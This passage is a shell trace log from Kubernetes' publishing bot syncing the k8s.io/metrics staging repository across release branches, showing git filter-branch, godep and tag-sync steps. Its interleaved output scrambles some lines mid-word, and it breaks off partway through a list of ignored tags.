'Checking out k8s.io/client-go to e2680bfa771859c129bc5c8413fdb565af2b3dcd'\n>\t+ git checkout -q e2680bfa771859c129bc5c8413fdb565af2b3dcd\n>\tChecking out k8s.io/client-go to e2680bfa771859c129bc5c8413fdb565af2b3dcd\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\t\t+ echo R'Running godep save.'\n>\t+ godep save ./...\n>unning godep save.\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.9 '!=' master ']'\n>\t+ echo 'Removing complete vendor/ on non-master branch because this is a library.'\n>\t+ rm -rf vendor/\n>\tRemoving complete vendor/ on non-master branch because this is a library.\n>\t+ git add Godeps/Godeps.json\n>\t+ git add vendor/ --ignore-errors\n>\t+ true\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tGodeps.json hasn't changed!\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.9 '!=' master ']'\n>\t+ '[' -d vendor/ ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code 5fe3b1a799c749ad543f7affb7a60a5b07091e30\n>\t\tR+e move ercho 'Remeove redundant godep commits on-top of 5fe3b1a799c749ad543f7affb7a60a5b07091e30.'\n>\t+ git reset --soft -q 5fe3b1a799c749ad543f7affb7a60a5b07091e30\n>dundant godep commits on-top of 5fe3b1a799c749ad543f7affb7a60a5b07091e30.\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/metrics\n>\t+ local repo=metrics\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n '5fe3b1a Merge pull request #65298 from nikhita/cherrypick-jsoniter-bump-1.9' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-metrics-release-1.9'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-metrics-release-1.9\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.9\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=5fe3b1a799c749ad543f7affb7a60a5b07091e30\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-metrics-release-1.9.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-metrics-release-1.9.sh\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.9 --push-script ../push-tags-metrics-release-1.9.sh --dependencies apimachinery:release-1.9,api:release-1.9,client-go:release-6.0 -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"origin\".\n>\tFetching tags from remote \"upstream\".\n>\tComputing mapping from kube commits to the local branch.\n>\tIgnoring already published tag kubernetes-1.9.9.\n>\tIgnoring already published tag kubernetes-1.9.1.\n>\tIgnoring already published tag kubernetes-1.9.4-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.5-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.0-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.5.\n>\tIgnoring already published tag kubernetes-1.9.11-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.6.\n>\tIgnoring already published tag kubernetes-1.9.0-beta.2.\n>\tIgnoring already published tag kubernetes-1.10.0-alpha.0.\n>\tIgnoring already published tag kubernetes-1.9.0-alpha.2.\n>\tIgnoring already published tag kubernetes-1.9.0.\n>\tIgnoring already published tag kubernetes-1.9.3.\n>\tIgnoring already published tag kubernetes-1.9.7.\n>\tIgnoring already published tag kubernetes-1.9.2.\n>\tIgnoring already published tag kubernetes-1.9.8-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.10-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.0-alpha.0.\n>\tIgnoring already published tag kubernetes-1.9.6-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.0-alpha.1.\n>\tIgnoring already published tag kubernetes-1.9.0-alpha.3.\n>\tIgnoring already published tag kubernetes-1.9.2-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.0-beta.1.\n>\tIgnoring already published tag kubernetes-1.9.7-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.9-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.8.\n>\tIgnoring already published tag kubernetes-1.9.4.\n>\tIgnoring already published tag kubernetes-1.9.1-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.10.\n>\tIgnoring already published tag kubernetes-1.9.3-beta.0.\n>\t++ git rev-parse release-1.9\n>\t+ '[' 5fe3b1a799c749ad543f7affb7a60a5b07091e30 '!=' 5fe3b1a799c749ad543f7affb7a60a5b07091e30 ']'\n>\t+ git checkout release-1.9\n>\tAlready on 'release-1.9'\n>\tYour branch is up-to-date with 'origin/release-1.9'.\n>[02 Sep 18 13:02 UTC]: Successfully constructed release-1.9\n>[02 Sep 18 13:02 UTC]: /publish_scripts/construct.sh metrics release-1.10 release-1.10 apimachinery:release-1.10,api:release-1.10,client-go:release-7.0  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/metrics kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"\n>\t+ '[' '!' 12 -eq 12 ']'\n>\t+ REPO=metrics\n>\t+ SRC_BRANCH=release-1.10\n>\t+ DST_BRANCH=release-1.10\n>\t+ DEPS=apimachinery:release-1.10,api:release-1.10,client-go:release-7.0\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/metrics\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ readonly SRC_BRANCH DST_BRANCH DEPS SOURCE_REMOTE SOURCE_REPO_ORG SOURCE_REPO_NAME BASE_PACKAGE SUBDIR IS_LIBRARY\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t\tF+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags\n>etching from origin.\n>\t\tCleaning u+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>p checkout.\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 5fe3b1a799c749ad543f7affb7a60a5b07091e30\n>\t+ git branch -D release-1.10\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.10\n>\t+ echo 'Switching to origin/release-1.10.'\n>\t+ Switchigit branch -f release-1.10 origin/release-1.10\n>ng to origin/release-1.10.\n>\t+ git checkout -q release-1.10\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/metrics release-1.10 release-1.10 /go-workspace/src/k8s.io/kubernetes/.git apimachinery:release-1.10,api:release-1.10,client-go:release-7.0 '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/metrics\n>\t+ local src_branch=release-1.10\n>\t+ local dst_branch=release-1.10\n>\t+ local kubernetes_remote=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ local deps=apimachinery:release-1.10,api:release-1.10,client-go:release-7.0\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ shift 9\n>\t+ local is_library=true\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch kubernetes_remote deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\tb11cf31b380ba10a99b7c0b900f6a71f1045db45\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 9 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting\t a+ echo 'Starting at existing releaset-1.10  commit b11cfe31b380ba10a99b7c0b900f6a71f1045db45.'\n>\t+ git remote rm upstream\n>xisting release-1.10 commit b11cf31b380ba10a99b7c0b900f6a71f1045db45.\n>\t+ git remote add upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/release-1.10\n>\tBranch upstream-branch set up to track remote branch release-1.10 from upstream.\n>\t++ git rev-parse upstream-branch\n>\t\tC+ echo 'Checked out source commit c6403d766708622303a2822c38ccfbaf371bd5a8.'\n>\t+ git checkout -heckeq upstream-branch -b filtered-branch\n>d out source commit c6403d766708622303a2822c38ccfbaf371bd5a8.\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit release-1.10\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B release-1.10\n>\t++ grep '^Kubernetes-commit: '\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ head -n 1\n>\t++ true\n>\t+ local k_base_commit=32ac1c9073b132b8ba18aa830f46b77dcceb0723\n>\t+ '[' -z 32ac1c9073b132b8ba18aa830f46b77dcceb0723 ']'\n>\t++ git-find-merge 32ac1c9073b132b8ba18aa830f46b77dcceb0723 upstream/release-1.10\n>\t++ tail -1\n>\t+++ git rev-list '32ac1c9073b132b8ba18aa830f46b77dcceb0723^1..upstream/release-1.10' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 32ac1c9073b132b8ba18aa830f46b77dcceb0723..upstream/release-1.10 --ancestry-path\n>\t+++ git rev-parse 32ac1c9073b132b8ba18aa830f46b77dcceb0723\n>\t+ local k_base_merge=32ac1c9073b132b8ba18aa830f46b77dcceb0723\n>\t+ '[' -z 32ac1c9073b132b8ba18aa830f46b77dcceb0723 ']'\n>\t+ git branch -f filtered-branch-base 32ac1c9073b132b8ba18aa830f46b77dcceb0723\n>\t\t+ echoR 'Rewreiting upstream branch release-1.10 to only include commits for stagwritining/src/k8s.io/metrics.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/metrics 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'g upstream filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/metrics\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\" '\n>\t+ index_filter+=' '\\'b'BrUIaLD'n\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/metrics -- filtered-branch filtered-branch-base\n>ch release-1.10 to only include commits for staging/src/k8s.io/metrics.\n>\tRunning git filter-branch ...\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=fed17874550713817ec34e018d6b437639407d13\n>\t++ git log --first-parent --format=%H --reverse fed17874550713817ec34e018d6b437639407d13..HEAD\n>\tC\th+ f_mainline_commits=\n>\t+ echo 'Checking out branch release-1.10.'\n>\t+ git checkout -qecki release-ng out b1r.10\n>anch release-1.10.\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=b11cf31b380ba10a99b7c0b900f6a71f1045db45\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=b11cf31b380ba10a99b7c0b900f6a71f1045db45\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\t++ git rev-parse HEAD\n>\tFixing up godeps after a complete sync\n>\t+ '[' b11cf31b380ba10a99b7c0b900f6a71f1045db45 '!=' b11cf31b380ba10a99b7c0b900f6a71f1045db45 ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps apimachinery:release-1.10,api:release-1.10,client-go:release-7.0 '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:release-1.10,api:release-1.10,client-go:release-7.0\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=b11cf31b380ba10a99b7c0b900f6a71f1045db45\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:release-1.10,api:release-1.10,client-go:release-7.0 k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:release-1.10,api:release-1.10,client-go:release-7.0\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t++ basename /go-workspace/src/k8s.io/metrics\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/metrics/\") or . == \"k8s.io/metrics\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning god+ echo 'Running godep restore.'\n>\t+ godep restore\n>ep restore.\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:release-1.10,api:release-1.10,client-go:release-7.0\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=32ac1c9073b132b8ba18aa830f46b77dcceb0723\n>\t+ '[' -z 32ac1c9073b132b8ba18aa830f46b77dcceb0723 ']'\n>\t++ git-find-merge 32ac1c9073b132b8ba18aa830f46b77dcceb0723 upstream-branch\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list '32ac1c9073b132b8ba18aa830f46b77dcceb0723^1..upstream-branch' --first-parent\n>\t+++ git rev-list 32ac1c9073b132b8ba18aa830f46b77dcceb0723..upstream-branch --ancestry-path\n>\t+++ git rev-parse 32ac1c9073b132b8ba18aa830f46b77dcceb0723\n>\t+ local k_last_kube_merge=32ac1c9073b132b8ba18aa830f46b77dcceb0723\n>\t+ local dep_count=3\n>\t+ (( i=0 ))\n>\t+ (( i<3 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=release-1.10\n>\t+ echo 'Looking up which commit in the release-1.10 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 32ac1c9073b132b8ba18aa830f46b77dcceb0723.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 32ac1c9073b132b8ba18aa830f46b77dcceb0723 ../kube-commits-apimachinery-release-1.10\n>\tLooking up which commit in the release-1.10 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 32ac1c9073b132b8ba18aa830f46b77dcceb0723.\n>\t+ '[' -z e386b2658ed20923da8cc9250e552f082899a1ee ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to e386b2658ed20923da8cc9250e552f082899a1ee'\n>\t+ git checkout -q e386b2658ed20923da8cc9250e552f082899a1ee\n>\tChecking out k8s.io/apimachinery to e386b2658ed20923da8cc9250e552f082899a1ee\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ local dep=api\n>\t+ local branch=release-1.10\n>\t+ echo 'Looking up which commit in the release-1.10 branch of k8s.io/api corresponds to k8s.io/kubernetes commit 32ac1c9073b132b8ba18aa830f46b77dcceb0723.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the release-1.10 branch of k8s.io/api corresponds to k8s.io/kubernetes commit 32ac1c9073b132b8ba18aa830f46b77dcceb0723.\n>\t++ look -b 32ac1c9073b132b8ba18aa830f46b77dcceb0723 ../kube-commits-api-release-1.10\n>\t+ '[' -z 8b7507fac302640dd5f1efbf9643199952cc58db ']'\n>\t+ pushd ../api\n>\t+ echo 'Checking out k8s.io/api to 8b7507fac302640dd5f1efbf9643199952cc58db'\n>\t+ git checkout -q 8b7507fac302640dd5f1efbf9643199952cc58db\n>\tChecking out k8s.io/api to 8b7507fac302640dd5f1efbf9643199952cc58db\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ local dep=client-go\n>\t+ local branch=release-7.0\n>\t+ echo 'Looking up which commit in the release-7.0 branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 32ac1c9073b132b8ba18aa830f46b77dcceb0723.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the release-7.0 branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 32ac1c9073b132b8ba18aa830f46b77dcceb0723.\n>\t++ look -b 32ac1c9073b132b8ba18aa830f46b77dcceb0723 ../kube-commits-client-go-release-7.0\n>\t\tC+ '[' -z a312bfe35c401f70e5ea0add48b50da283031dc3 ']'\n>\t+ pushd ../hecking out k8s.io/client-go to a312bfe3client-go\n>\t+ echo 'Checking out k8s.io/client-go to a312bfe35c401f70e5ea0add48b50da283031dc3'\n>\t+ git checkout -q a312bfe35c401f70e5ea0add48b50da283031dc3\n>5c401f70e5ea0add48b50da283031dc3\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\t\t+ echo R'Running godep save.'\n>\t+ godep save .unning /...\n>godep save.\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t\t+ '[' release-1.10 '!=' master ']'\n>\t+ echo 'Removing complete vendor/ on non-master branch because this is a library.'\n>\t+ rm -rf vendor/\n>Removing complete vendor/ on non-master branch because this is a library.\n>\t+ git add Godeps/Godeps.json\n>\t+ git add vendor/ --ignore-errors\n>\t+ true\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tGodeps.json hasn't changed!\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.10 '!=' master ']'\n>\t+ '[' -d vendor/ ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code b11cf31b380ba10a99b7c0b900f6a71f1045db45\n>\t\t+ echo 'Remove reRdundant godep commits on-top of b11cf31b380ba10a99b7c0b900f6a71f1045db45.'\n>\t+ git reset --soft -q b11cf31b380ba10a99b7c0b900f6a71f1emo045db45\n>ve redundant godep commits on-top of b11cf31b380ba10a99b7c0b900f6a71f1045db45.\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/metrics\n>\t+ local repo=metrics\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n 'b11cf31 Merge pull request #65157 from caesarxuchao/cherrypick-65034-1.10' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-metrics-release-1.10'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-metrics-release-1.10\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.10\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=b11cf31b380ba10a99b7c0b900f6a71f1045db45\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-metrics-release-1.10.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-metrics-release-1.10.sh\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.10 --push-script ../push-tags-metrics-release-1.10.sh --dependencies apimachinery:release-1.10,api:release-1.10,client-go:release-7.0 -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"origin\".\n>\tFetching tags from remote \"upstream\".\n>\tComputing mapping from kube commits to the local branch.\n>\tIgnoring already published tag kubernetes-1.9.0-alpha.2.\n>\tIgnoring already published tag kubernetes-1.10.6.\n>\tIgnoring already published tag kubernetes-1.11.0-alpha.0.\n>\tIgnoring already published tag kubernetes-1.10.2.\n>\tIgnoring already published tag kubernetes-1.10.0-alpha.0.\n>\tIgnoring already published tag kubernetes-1.9.0-alpha.1.\n>\tIgnoring already published tag kubernetes-1.10.5-beta.0.\n>\tIgnoring already published tag kubernetes-1.10.6-beta.0.\n>\tIgnoring already published tag kubernetes-1.10.1-beta.0.\n>\tIgnoring already published tag kubernetes-1.10.0-alpha.1.\n>\tIgnoring already published tag kubernetes-1.10.4-beta.0.\n>\tIgnoring already published tag kubernetes-1.10.4.\n>\tIgnoring already published tag kubernetes-1.10.3-beta.0.\n>\tIgnoring already published tag kubernetes-1.10.0-alpha.2.\n>\tIgnoring already published tag kubernetes-1.10.0-beta.0.\n>\tIgnoring already published tag kubernetes-1.10.7.\n>\tIgnoring already published tag kubernetes-1.9.0-alpha.0.\n>\tIgnoring already published tag kubernetes-1.10.0-beta.1.\n>\tIgnoring already published tag kubernetes-1.10.0-alpha.3.\n>\tIgnoring already published tag kubernetes-1.10.0-beta.3.\n>\tIgnoring already published tag kubernetes-1.10.5.\n>\tIgnoring already published tag kubernetes-1.10.0-rc.1.\n>\tIgnoring already published tag kubernetes-1.9.0-alpha.3.\n>\tIgnoring already published tag kubernetes-1.10.0-beta.2.\n>\tIgnoring already published tag kubernetes-1.10.1.\n>\tIgnoring already published tag kubernetes-1.10.7-beta.0.\n>\tIgnoring already published tag kubernetes-1.10.8-beta.0.\n>\tIgnoring already published tag kubernetes-1.10.3.\n>\tIgnoring already published tag 